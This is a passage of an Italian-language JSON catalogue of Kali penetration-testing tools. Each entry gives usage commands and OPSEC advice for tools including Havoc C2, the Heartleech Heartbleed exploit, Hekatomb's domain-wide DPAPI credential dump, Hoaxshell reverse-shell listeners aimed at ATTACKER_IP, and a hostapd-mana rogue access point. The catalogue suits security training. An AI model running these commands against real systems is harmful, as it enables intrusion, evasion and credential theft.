    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HashID</strong> e uno strumento avanzato che riconosce oltre 220 tipi di hash e fornisce direttamente i parametri per hashcat (<code>-m</code>) e John the Ripper. A differenza di hash-identifier, offre un database molto piu ampio e suggerisce immediatamente i moduli di cracking, eliminando consultazioni di documentazione. Analizza lunghezza, charset, prefissi e struttura del digest con alta precisione. E il tool di riferimento per l'identificazione hash nella comunita del penetration testing.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Database esteso 220+ algoritmi:</strong> Copre algoritmi standard (MD5, SHA, bcrypt), formati CMS (WordPress, Joomla), hash OS (NTLM, LM, crypt variants), hash database (MySQL, Oracle, MSSQL) e formati esotici. Copertura efficace in qualsiasi scenario di pentesting.</p><p><strong>Integrazione hashcat e John:</strong> Con <code>-m</code> mostra il numero di modulo hashcat, con <code>-j</code> il formato John. Permette di lanciare immediatamente il cracking con parametri corretti eliminando errori di configurazione.</p><p><strong>Batch mode e output esteso:</strong> Processa file con liste di hash automaticamente. La modalita estesa (<code>-e</code>) include algoritmi meno comuni. Gestisce hash con salt, prefissi speciali e formati base64.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si usa passando l'hash come argomento o specificando un file.</p><pre><code># Identifica con modulo hashcat\nhashid -m '5d41402abc4b2a76b9719d911017c592'\n# Output: [+] MD5 [Hashcat Mode: 0]\n\n# Con suggerimenti hashcat e John\nhashid -m -j '5d41402abc4b2a76b9719d911017c592'\n\n# Processa file di hash\nhashid -m hashes.txt\n\n# Modalita estesa per hash rari\nhashid -e -m '$2a$10$N9qo8uLO...'\n# Output: [+] bcrypt [Hashcat Mode: 3200]\n\n# Pipeline\ncat hashes.txt | hashid -m</code></pre><p>Usare il modulo suggerito: <code>hashcat -m [numero] hash.txt wordlist.txt</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>password cracking</strong>, primo tool da usare dopo estrazione hash da qualsiasi fonte, fornendo parametri corretti per hashcat. Nell'<strong>analisi di breach</strong>, categorizza rapidamente migliaia di hash per tipo con il batch mode. Nelle <strong>CTF</strong>, accelera il riconoscimento di algoritmi insoliti nelle challenge.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Opera completamente offline senza traffico di rete. Invisibile a qualsiasi sistema di monitoraggio.</p><p><strong>Impatto operativo:</strong> Identificazione probabilistica, non deterministica. Se il primo algoritmo fallisce provare i successivi. Verificare che hashcat riceva l'hash nel formato esatto atteso.</p><p><strong>Mitigazioni:</strong> Non caricare hash su servizi online. Mantenere hashid aggiornato per formati recenti. Conservare file hash su volumi cifrati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "hashrat",
    "name": "hashrat",
    "version": "1.25",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashrat/",
    "desc": "Calcola e verifica hash di file con supporto per algoritmi multipli e CGI mode.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HashRat</strong> è uno strumento versatile per il calcolo e la verifica di hash crittografici su file e directory. A differenza delle utility standard come md5sum o sha256sum, offre funzionalità avanzate come hashing ricorsivo, verifica batch, output in formati multipli, modalità CGI per integrazione web, e supporto per algoritmi moderni. È particolarmente utile in contesti forensi dove la documentazione dell'integrità dei file è critica.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Hash Algorithms:</strong> Supporta una vasta gamma di algoritmi: MD5, SHA-1, SHA-256, SHA-512, Whirlpool, RIPEMD, e varianti HMAC. Permette di calcolare hash multipli simultaneamente per conformità a diversi standard forensi.</p><p><strong>Recursive Directory Hashing:</strong> Calcola hash di intere strutture di directory in modo ricorsivo, generando un manifest completo di tutti i file con i relativi hash. Supporta filtri per escludere pattern o estensioni specifiche.</p><p><strong>Verification Mode:</strong> Verifica l'integrità di file confrontando gli hash attuali con quelli precedentemente salvati in un file di controllo. Segnala file modificati, mancanti, o aggiunti - essenziale per chain of custody in contesti forensi.</p><p><strong>CGI Web Mode:</strong> Può essere eseguito come script CGI, permettendo il calcolo di hash tramite interfaccia web. Utile per servizi interni di verifica file o integrazione in workflow automatizzati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>HashRat si usa da riga di comando con opzioni intuitive per algoritmo e modalità operativa.</p><pre><code># Hash MD5 di un singolo file (default)\nhashrat file.txt\n\n# Hash SHA-256\nhashrat -sha256 file.txt\n\n# Hash SHA-512 di directory ricorsivamente\nhashrat -sha512 -r /evidence/disk_image/\n\n# Genera file di controllo per verifica futura\nhashrat -sha256 -r /evidence/ > evidence_hashes.txt\n\n# Verifica integrità contro hash salvati\nhashrat -c evidence_hashes.txt\n\n# Output in formato specificato (trad, bsd, coreutils)\nhashrat -sha256 -trad file.txt\n\n# HMAC con chiave\nhashrat -sha256 -hmac -k secret_key file.txt</code></pre><p>L'output può essere rediretto a file per documentazione forense o confronto successivo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Digital Forensics</strong>, HashRat è fondamentale per stabilire e documentare la chain of custody, calcolando hash di evidence al momento dell'acquisizione e verificandoli in fasi successive dell'investigazione.</p><p>Per <strong>File Integrity Monitoring</strong>, può essere usato per creare baseline di sistemi e verificare periodicamente che i file critici non siano stati modificati.</p><p>Durante <strong>Incident Response</strong>, permette di identificare rapidamente file modificati o aggiunti confrontando lo stato attuale con baseline precedenti.</p><p>Per <strong>Download Verification</strong>, verifica che file scaricati da internet corrispondano agli hash pubblicati, prevenendo l'esecuzione di file corrotti o manomessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Uso Legittimo:</strong> HashRat è una utility di sistema standard senza implicazioni di sicurezza negative. Non modifica i file esaminati ed è puramente passivo.</p><p><strong>Limitazioni Forensi:</strong> Per contesti forensi professionali con requisiti di audit trail, considerare hashdeep che offre audit mode e matching positivo/negativo più sofisticato.</p><p><strong>Collision Awareness:</strong> MD5 e SHA-1 sono vulnerabili a collision attacks. Per evidenze forensi critiche, preferire SHA-256 o superiore.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "havoc",
    "name": "havoc",
    "version": "0.6~git20240910.69ce17c",
    "icon": "../app/icons/havoc-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/havoc/",
    "desc": "C2 framework moderno con GUI, demon agent, BOF support e evasion integrata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Havoc</strong> e un framework C2 di nuova generazione, open source, per operazioni di red teaming avanzate. Si distingue per GUI nativa, agent \"Demon\" con evasion all'avanguardia e supporto completo per Beacon Object Files (BOF). Implementa sleep obfuscation per nascondere l'agent in memoria, syscall indiretti per evitare hook EDR e stack spoofing per mascherare call stack sospette. Si posiziona come alternativa open source a Cobalt Strike con architettura modulare ed estensioni via plugin.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Demon Agent con evasion:</strong> Incorpora sleep obfuscation (cifra la memoria durante sleep), syscall indiretti via trampolini in ntdll per bypassare hook EDR, e stack spoofing per call stack legittime. Significativamente piu difficile da rilevare rispetto a implant tradizionali.</p><p><strong>Supporto BOF e modularita:</strong> Esegue Beacon Object Files in memoria dell'agent senza toccare disco. Centinaia di BOF community per credential dumping, lateral movement, enumeration AD. Footprint minimale e capacita estensibili.</p><p><strong>GUI e gestione operativa:</strong> Interfaccia grafica con sessioni attive, console, gestione listener, generazione payload e logging. L'architettura teamserver permette collaborazione simultanea di piu operatori.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Avviare teamserver, connettere client GUI, configurare listener e generare payload.</p><pre><code># Avvia teamserver\nsudo ./havoc server --profile profiles/havoc.yaotl -v\n\n# Connetti client GUI\n./havoc client\n\n# Dalla GUI: configura listener, genera Demon payload\n# Comandi Demon dalla console:\n# shell whoami\n# upload file.exe\n# download C:\\secret.txt\n# inject x64 PID\n# bof inline-execute modulo.o</code></pre><p>I profili YAOTL personalizzano listener, comunicazione, sleep e jitter.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, C2 con evasion integrate per simulare minacce avanzate testando EDR e SOC. Nell'<strong>adversary simulation</strong>, replica TTP di APT con BOF modulari generando telemetria per il blue team. Per <strong>ricerca offensiva</strong>, piattaforma open source per sviluppo di nuove tecniche di evasion.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Signature sempre piu note ai vendor EDR. Build non modificate rilevabili da soluzioni enterprise. Personalizzare profili e compilare payload custom per engagement reali.</p><p><strong>Impatto operativo:</strong> Traffico analizzabile da proxy senza adeguato mascheramento. Configurare sleep e jitter appropriati. Usare domain fronting o redirector per nascondere infrastruttura.</p><p><strong>Mitigazioni:</strong> Compilare da sorgente con modifiche custom. Certificati SSL validi per HTTPS. Kill date nei payload. Teamserver su infrastruttura dedicata.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "hcxtools",
    "name": "hcxtools",
    "version": "6.3.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hcxtools/",
    "desc": "Converte capture WiFi (PMKID, handshake) in formato hashcat per cracking veloce.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HCXtools</strong> e una suite per conversione e processamento di capture WiFi per il cracking con hashcat. Gestisce PMKID e handshake WPA/WPA2/WPA3 convertendoli nel formato unificato .hc22000 per GPU. <code>hcxpcapngtool</code> analizza e converte le catture, mentre <code>hcxdumptool</code> esegue catture ottimizzate per hashcat. Ha rivoluzionato il WiFi cracking con il supporto PMKID, che permette cracking senza handshake completo e senza client connessi alla rete target.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Conversione formato hc22000:</strong> <code>hcxpcapngtool</code> converte .cap, .pcap e .pcapng nel formato unificato .hc22000 che combina PMKID e handshake. Analizza qualita del materiale, segnala handshake incompleti e filtra contenuto non rilevante automaticamente.</p><p><strong>Estrazione PMKID:</strong> Il PMKID e un valore nell'AP incluso nel primo messaggio del four-way handshake. HCXtools lo estrae permettendo cracking senza handshake completo, eliminando la necessita di deauth e attesa riconnessione client.</p><p><strong>Cattura ottimizzata:</strong> <code>hcxdumptool</code> si concentra sull'acquisizione del solo materiale crittografico necessario, riducendo dimensione file e migliorando qualita rispetto a catture generiche con airodump-ng.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Workflow: cattura con hcxdumptool, conversione con hcxpcapngtool, cracking con hashcat.</p><pre><code># Cattura WiFi ottimizzata\nsudo hcxdumptool -i wlan0mon -o capture.pcapng --active_beacon\n\n# Converti in formato hc22000\nhcxpcapngtool -o hash.hc22000 capture.pcapng\n\n# Solo PMKID\nhcxpcapngtool --pmkid-only -o pmkid.hc22000 capture.pcapng\n\n# Info sulla cattura\nhcxpcapngtool --info capture.pcapng\n\n# Cracka con hashcat\nhashcat -m 22000 hash.hc22000 wordlist.txt</code></pre><p>Interfaccia wireless in monitor mode con supporto injection per catture attive PMKID.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>WiFi pentesting</strong>, pipeline dalla cattura al cracking con PMKID che non richiede client e non genera deauth visibili. Per <strong>assessment wireless aziendale</strong>, valuta robustezza password WiFi da tutti gli AP nel raggio. Nella <strong>ricerca WiFi</strong>, studio di protocolli di autenticazione e efficacia tecniche di cracking.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> hcxdumptool genera traffico rilevabile da WIDS/WIPS. Richieste PMKID identificabili come anomale. La conversione con hcxpcapngtool e completamente offline.</p><p><strong>Impatto operativo:</strong> PMKID piu silenzioso dei deauth tradizionali, non disconnette client. La richiesta di associazione lascia tracce nei log wireless.</p><p><strong>Mitigazioni:</strong> Limitare durata sessioni di cattura. Filtrare per ESSID target per evitare reti fuori scope. Operare in finestre temporali concordate.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "heartleech",
    "name": "heartleech",
    "version": "0~git20140607.3ab1d60",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/heartleech/",
    "desc": "Exploit Heartbleed per estrarre memoria dal server SSL e recuperare chiavi private.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Heartleech</strong> e un tool di exploitation per la vulnerabilita Heartbleed (CVE-2014-0160), che consente di leggere fino a 64KB di memoria dal processo OpenSSL del server per ogni richiesta malformata dell'estensione heartbeat. Automatizza l'estrazione ripetuta di blocchi di memoria alla ricerca di chiavi private SSL, cookie di sessione, credenziali e token di autenticazione. Sebbene la maggior parte dei server sia patchata dal 2014, sistemi legacy, IoT e appliance non aggiornate possono ancora essere vulnerabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Estrazione automatica memoria:</strong> Invia ripetutamente richieste heartbeat malformate raccogliendo blocchi di 64KB. La ripetizione e fondamentale perche i dati sensibili come chiavi private appaiono in porzioni specifiche della memoria che potrebbero non emergere nelle prime richieste.</p><p><strong>Recupero chiavi private:</strong> La modalita <code>--autopwn</code> analizza automaticamente il dump cercando strutture RSA valide. Il recupero della chiave privata consente decifratura di tutto il traffico TLS passato e futuro senza Perfect Forward Secrecy.</p><p><strong>Modalita verifica e cattura:</strong> Verifica se un server e vulnerabile senza procedere all'estrazione, utile per assessment non intrusivi. Supporta cattura continua, iterazioni specificate e dump raw per analisi offline.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Verificare vulnerabilita, estrarre memoria, analizzare dump.</p><pre><code># Verifica se vulnerabile\nheartleech -t target.com -p 443\n\n# Estrai memoria\nheartleech target.com -f memory_dump.bin\n\n# Cerca chiavi private automaticamente\nheartleech target.com --autopwn\n\n# Loop continuo\nheartleech target.com -l -f dump.bin\n\n# Analizza dump\nstrings memory_dump.bin | grep -i password\nstrings memory_dump.bin | grep -i cookie</code></pre><p>Ogni esecuzione estrae un blocco diverso di memoria, ripetere per massimizzare i dati ottenuti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>testing legacy</strong>, verifica server vecchi, IoT e appliance non patchate, comuni in ambienti industriali e sanitari. Nelle <strong>CTF</strong>, Heartbleed e frequente nelle challenge per comprendere memory disclosure. Per <strong>audit TLS</strong>, la verifica fa parte delle scansioni di conformita in settori regolamentati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Rilevabile da IDS/IPS con signature per heartbeat malformato (Snort, Suricata). Non lascia tracce nei log applicativi standard perche il traffico avviene dentro la connessione TLS.</p><p><strong>Impatto operativo:</strong> La maggior parte dei server pubblici e patchata. Lo sfruttamento ripetuto puo causare instabilita in casi rari. Chiave privata recuperata consente MITM senza PFS.</p><p><strong>Mitigazioni:</strong> Verificare autorizzazione esplicita. Limitare iterazioni al minimo per verifica. Gestire dati estratti come informazioni classificate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "SSL_TLS"
    ],
    "notes": null
  },
  {
    "id": "hekatomb",
    "name": "hekatomb",
    "version": "1.5.14",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hekatomb/",
    "desc": "Estrae credenziali DPAPI da tutti i computer del dominio usando backup key del DC.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hekatomb</strong> e uno strumento di post-exploitation per l'estrazione massiva di credenziali DPAPI da tutti i computer di un dominio Active Directory. Sfrutta la backup key DPAPI conservata nel Domain Controller, che puo decriptare qualsiasi secret DPAPI su qualsiasi macchina del dominio. Con accesso Domain Admin, recupera questa chiave e la usa per connettersi via SMB a ogni computer, estrarre i blob DPAPI e decriptarli, recuperando password browser, credenziali WiFi, certificati e qualsiasi secret gestito da DPAPI in modo completamente automatizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Estrazione DPAPI backup key:</strong> Si connette al DC con credenziali Domain Admin ed estrae la backup key tramite MS-BKRP. Questa chiave master permette di decriptare secret DPAPI di qualsiasi utente su qualsiasi macchina, rappresentando accesso totale alle credenziali salvate.</p><p><strong>Raccolta automatica domain-wide:</strong> Enumera computer via LDAP, si connette a ciascuno via SMB, naviga nei profili utente cercando file DPAPI (master key, credential blob, login data) e li scarica. Processa centinaia di macchine senza intervento manuale.</p><p><strong>Decriptazione credenziali:</strong> Decripta i blob con la backup key estraendo password da Chrome, Edge, Firefox, credenziali WiFi, certificati con chiave privata e Windows Vault. Risultati esportabili in formato strutturato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Domain Admin e connettivita verso DC e macchine del dominio.</p><pre><code># Estrai da tutto il dominio\nhekatomb -d domain.local -u administrator -p 'P@ssw0rd!' -dc dc01.domain.local\n\n# Pass-the-hash\nhekatomb -d domain.local -u admin -H aad3b435b51404ee:31d6cfe0d16ae931 -dc dc01.domain.local\n\n# Solo computer specifici\nhekatomb -d domain.local -u admin -p pass --computers targets.txt -dc dc01.domain.local\n\n# Esporta in JSON\nhekatomb -d domain.local -u admin -p pass -dc dc01.domain.local -o results.json</code></pre><p>L'esecuzione puo richiedere tempo significativo in domini con molte macchine.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>post-exploitation dopo Domain Admin</strong>, recupera tutte le credenziali salvate da ogni utente su ogni macchina, rivelando spesso password per servizi esterni e cloud. Per <strong>valutazione impatto compromissione AD</strong>, dimostra il danno potenziale di un DA compromise con report quantificabili. Nel <strong>lateral movement</strong>, le credenziali includono spesso password per sistemi non legati al dominio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera connessioni SMB massive verso tutte le macchine, pattern anomalo rilevabile da SIEM. L'accesso alla backup key genera eventi nei security log del DC. EDR possono rilevare accesso ai file DPAPI.</p><p><strong>Impatto operativo:</strong> Richiede Domain Admin. Il carico di rete delle connessioni SMB potrebbe essere notato. Macchine offline vengono saltate automaticamente.</p><p><strong>Mitigazioni:</strong> Limitare a sottoinsiemi di macchine. Eseguire in orari di bassa attivita. Usare Kerberos per evitare credenziali in chiaro sulla rete. Cancellazione sicura dei risultati a fine engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "hexinject",
    "name": "hexinject",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hexinject/",
    "desc": "Inietta pacchetti raw nella rete e sniffa traffico in formato hex per analisi manuale.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HexInject</strong> e un tool di basso livello per packet injection e sniffing in formato esadecimale. A differenza di Scapy o hping3, opera direttamente con rappresentazioni hex dei pacchetti offrendo controllo su ogni singolo byte. Permette di catturare traffico visualizzandolo in hex per analisi manuale e di iniettare pacchetti raw specificati byte per byte. L'interfaccia basata su pipe Unix lo rende ideale per integrazione con script per automazione e trasformazione del traffico in tempo reale.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Sniffing esadecimale:</strong> Cattura pacchetti dalla rete come stringhe hex con ogni byte come due cifre separate da spazi. Permette analisi manuale di ogni campo dal header Ethernet al payload. Supporta filtri BPF e output redirezionabile a file o script.</p><p><strong>Injection pacchetti raw:</strong> Accetta stringhe hex da stdin e le trasmette come pacchetti raw sull'interfaccia. Permette crafting di frame Ethernet malformati, pacchetti IP con opzioni custom, segmenti TCP con flag arbitrari. Controllo completo su ogni byte trasmesso.</p><p><strong>Integrazione pipeline Unix:</strong> Architettura stdin/stdout perfetta per pipeline con script Python, awk o sed. Lo sniffing si collega a script di filtraggio, l'injection riceve input da generatori custom. Costruzione di tool di rete combinando componenti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede privilegi root. Modalita sniff (<code>-s</code>) per cattura, inject (<code>-p</code>) per trasmissione.</p><pre><code># Sniffa traffico in hex\nsudo hexinject -s -i eth0\n\n# Sniffa con filtro BPF\nsudo hexinject -s -i eth0 -f 'tcp port 80'\n\n# Inietta pacchetto raw\necho \"ff ff ff ff ff ff 00 11 22 33 44 55 08 00 ...\" | sudo hexinject -p -i eth0\n\n# Cattura e analizza con script\nsudo hexinject -s -i eth0 | python3 analyze.py\n\n# Salva cattura su file\nsudo hexinject -s -i eth0 > capture.hex</code></pre><p>Ogni pacchetto Ethernet minimo occupa almeno 42 coppie hex. Per pacchetti complessi generare la stringa con script.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>ricerca protocolli</strong>, analizza e manipola traffico byte per byte per reverse engineering di protocolli proprietari. Nello <strong>sviluppo exploit</strong>, testa vulnerabilita in stack TCP/IP con input malformati costruiti precisamente. Nel <strong>debug di rete</strong>, visibilita completa su ogni byte per diagnosticare problemi di interoperabilita.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Injection rilevabile da IDS/IPS se i pacchetti presentano anomalie. Sniffing richiede modo promiscuo rilevabile su reti gestite. Traffico ben costruito e indistinguibile da legittimo.</p><p><strong>Impatto operativo:</strong> Pacchetti malformati possono causare instabilita di rete o crash di dispositivi. Possono attivare port security e DHCP snooping. Operare con cautela in produzione.</p><p><strong>Mitigazioni:</strong> Testare pacchetti in ambiente controllato. Usare filtri BPF specifici per minimizzare dati catturati. Documentare ogni pacchetto iniettato per reportistica.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "hoaxshell",
    "name": "hoaxshell",
    "version": "0.0~git20250119.e1bba89",
    "icon": "../app/icons/hoaxshell-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hoaxshell/",
    "desc": "Reverse shell via PowerShell che comunica con richieste HTTP per evitare detection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HoaxShell</strong> e un generatore di reverse shell PowerShell che usa comunicazioni HTTP/HTTPS al posto di socket tradizionali. I payload sfruttano cmdlet nativi come <code>Invoke-WebRequest</code> per comunicare con il server dell'attaccante tramite GET e POST, facendo apparire il traffico C2 come normale navigazione web. Progettato per ambienti con egress filtering che permette solo HTTP/HTTPS. Il listener integrato gestisce sessioni e permette esecuzione interattiva di comandi. Efficace per quick access iniziale prima di passare a C2 piu completi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Comunicazione HTTP nativa:</strong> Usa esclusivamente cmdlet PowerShell legittimi senza assembly .NET o socket raw. Il target fa GET periodiche per ricevere comandi e POST per inviare risultati. Pattern indistinguibile da navigazione web per firewall tradizionali.</p><p><strong>Payload multipli:</strong> Genera payload standard con <code>Invoke-WebRequest</code>, versioni per Constrained Language Mode, varianti con <code>cmd.exe</code> sottostante e opzioni con offuscamento base. Personalizzabili con IP, porta e intervallo di callback.</p><p><strong>Listener integrato:</strong> Server HTTP/HTTPS che gestisce sessioni attive, esecuzione interattiva e output in tempo reale. Supporta HTTPS con certificati auto-firmati per cifrare le comunicazioni contro ispezione traffico.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Avviare listener, generare payload ed eseguirlo sul target.</p><pre><code># Listener HTTP e payload standard\npython3 hoaxshell.py -s ATTACKER_IP -p 8080\n\n# Payload HTTPS\npython3 hoaxshell.py -s ATTACKER_IP -p 443 -c\n\n# Per Constrained Language Mode\npython3 hoaxshell.py -s ATTACKER_IP -p 8080 -t constrained\n\n# Payload basato su cmd.exe\npython3 hoaxshell.py -s ATTACKER_IP -p 8080 -t cmd\n\n# Header custom\npython3 hoaxshell.py -s ATTACKER_IP -p 8080 -H \"User-Agent: Mozilla/5.0\"</code></pre><p>Il tool stampa il payload PowerShell da eseguire sul target. Dopo l'esecuzione la shell diventa interattiva nel terminale del listener.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>initial access con egress filtering</strong>, shell funzionale quando solo HTTP e permesso, comune in reti aziendali con proxy. Nel <strong>testing detection</strong>, valuta se i controlli distinguono traffico C2 da navigazione legittima e se PowerShell logging cattura le operazioni. Per <strong>phishing</strong>, payload incorporabili in documenti Office con comunicazioni che passano attraverso proxy.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PowerShell Script Block Logging cattura i payload completi. AMSI puo rilevare i pattern generati. Proxy con SSL inspection ispezionano HTTPS. EDR correlano esecuzione PowerShell con connessioni HTTP.</p><p><strong>Impatto operativo:</strong> Shell semplici senza persistence o evasion EDR avanzata. Piu adatto come accesso iniziale prima di C2 completo. Intervallo callback fisso crea pattern rilevabile da analisi comportamentale.</p><p><strong>Mitigazioni:</strong> Offuscare payload per ridurre matching AMSI. Usare HTTPS per cifrare comunicazioni. Variare intervalli callback. Passare a C2 completo il prima possibile dopo accesso iniziale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "hostapd-mana",
    "name": "hostapd-mana",
    "version": "2.6.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hostapd-mana/",
    "desc": "Hostapd patchato per creare rogue AP con KARMA attack e cattura credenziali EAP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hostapd-MANA</strong> e una versione pesantemente modificata del demone hostapd, sviluppata dal team di SensePost (ora parte di Orange Cyberdefense), progettata specificamente per condurre attacchi wireless avanzati di tipo rogue Access Point. Il cuore del progetto risiede nell'implementazione dell'attacco KARMA, una tecnica che sfrutta il comportamento dei client WiFi di inviare probe request per le reti salvate: MANA risponde a qualsiasi probe dichiarando di essere la rete cercata, inducendo cosi i client a connettersi automaticamente. Oltre al KARMA classico, MANA introduce la modalita Loud KARMA che broadcast attivamente gli SSID rilevati, aumentando drasticamente l'efficacia dell'attacco. Il framework include anche funzionalita integrate per la cattura di credenziali EAP enterprise, il relay di traffico e l'integrazione nativa con strumenti come sslstrip2, dns2proxy e Responder per costruire catene di attacco wireless complete.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>KARMA Attack Engine:</strong> Il motore KARMA intercetta tutte le probe request trasmesse dai dispositivi WiFi nelle vicinanze e risponde automaticamente fingendo di essere ciascuna rete richiesta. Questo sfrutta il fatto che la maggior parte dei dispositivi tenta periodicamente di riconnettersi a reti conosciute, permettendo di catturare client senza alcuna interazione dell'utente. La variante Loud KARMA estende questo comportamento trasmettendo attivamente beacon frame per tutti gli SSID osservati, rendendo il rogue AP visibile anche a client che non stanno attivamente cercando reti.</p><p><strong>Cattura Credenziali EAP:</strong> MANA implementa un server RADIUS integrato capace di accettare e loggare tentativi di autenticazione EAP enterprise, inclusi PEAP, EAP-TTLS e EAP-TLS. Quando un client tenta di autenticarsi al rogue AP credendolo la rete aziendale, le credenziali (challenge/response MSCHAPv2 o certificati) vengono catturate e salvate per successivo cracking offline. Questa funzionalita e particolarmente devastante in ambienti corporate dove i dispositivi sono configurati per connettersi automaticamente alla rete aziendale.</p><p><strong>Integrazione con Tool di Attacco:</strong> MANA si integra nativamente con un ecosistema di strumenti post-connessione che permettono di massimizzare l'impatto dell'attacco. Sslstrip2 intercetta e downgrada connessioni HTTPS, dns2proxy permette di manipolare risoluzioni DNS per redirect malevoli, e Responder cattura hash NTLM e altre credenziali tramite protocolli come LLMNR e NBT-NS. Questa pipeline completa trasforma la semplice connessione WiFi in un vettore di compromissione completo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'utilizzo di hostapd-mana richiede un'interfaccia wireless che supporti la modalita AP (Access Point) e monitor mode contemporaneamente. E necessario configurare il file hostapd-mana.conf con i parametri desiderati prima dell'avvio.</p><pre><code># Configurazione base con KARMA abilitato\n# File: hostapd-mana.conf\ninterface=wlan0\ndriver=nl80211\nhw_mode=g\nchannel=6\nssid=FreeWiFi\nenable_mana=1\nmana_loud=1\nmana_macacl=0\n\n# Avvio del rogue AP\nhostapd-mana hostapd-mana.conf\n\n# In un terminale separato, configura NAT e DHCP\nip addr add 10.0.0.1/24 dev wlan0\ndnsmasq -i wlan0 --dhcp-range=10.0.0.10,10.0.0.250\niptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n\n# Per cattura credenziali con Responder\nresponder -I wlan0 -wrf</code></pre><p>E fondamentale monitorare il log di hostapd-mana per le credenziali catturate. I challenge MSCHAPv2 possono essere crackati con hashcat (mode 5500) o asleap per ottenere le password in chiaro.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>WiFi Penetration Testing</strong>, hostapd-mana viene utilizzato per valutare la sicurezza dei client wireless aziendali, verificando se i dispositivi si connettono automaticamente a rogue AP e se le policy di validazione dei certificati EAP sono correttamente implementate. Questo e uno dei test piu critici per reti WPA2-Enterprise.</p><p>Durante operazioni di <strong>Red Team</strong>, il tool permette di stabilire un punto di accesso 